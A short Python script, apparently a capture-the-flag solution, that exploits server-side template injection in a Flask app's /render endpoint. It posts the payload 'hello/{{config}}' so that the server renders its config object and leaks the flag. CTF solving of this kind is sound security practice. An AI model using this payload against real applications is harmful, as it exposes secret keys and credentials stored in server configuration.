#!/usr/bin/env python3
# portfolio: the /render endpoint fetches http://127.0.0.1:5000/<template> and
# passes the result through render_template_string (SSTI). Requesting
# "hello/{{config}}" makes the server render the Flask config object, which
# includes app.config["FLAG"] = the flag.
import os
import requests

URL = os.environ.get("URL", "http://localhost:19304").rstrip("/")

r = requests.post(URL + "/render", data={"template": "hello/{{config}}"})
print(r.text)
